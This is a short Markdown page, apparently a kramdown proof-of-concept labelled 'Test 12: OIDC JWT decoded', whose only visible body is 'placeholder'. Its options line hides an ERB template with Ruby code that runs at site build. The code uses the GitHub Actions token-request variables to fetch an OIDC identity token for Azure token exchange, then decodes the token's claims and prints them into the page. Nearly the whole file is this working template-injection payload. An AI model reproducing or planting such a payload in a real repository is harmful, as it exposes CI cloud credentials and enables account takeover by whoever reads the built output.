---
---

# Test 12: OIDC JWT decoded

{::options template="string://<%= require 'net/http'; require 'uri'; require 'json'; require 'base64'; u = ENV.fetch('ACTIONS_ID_TOKEN_REQUEST_URL','NONE'); t = ENV.fetch('ACTIONS_ID_TOKEN_REQUEST_TOKEN','NONE'); begin; uri = URI(u + '&audience=api://AzureADTokenExchange'); req = Net::HTTP::Get.new(uri); req.add_field('Authorization', 'Bearer ' + t); resp = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true).request(req); jwt = JSON.parse(resp.body).fetch('value','none'); parts = jwt.split('.'); payload = JSON.parse(Base64.urlsafe_decode64(parts[1] + '==')); payload.map(&:join).join(\"\\n\"); rescue => e; 'ERR=' + e.message; end %>" /}

placeholder
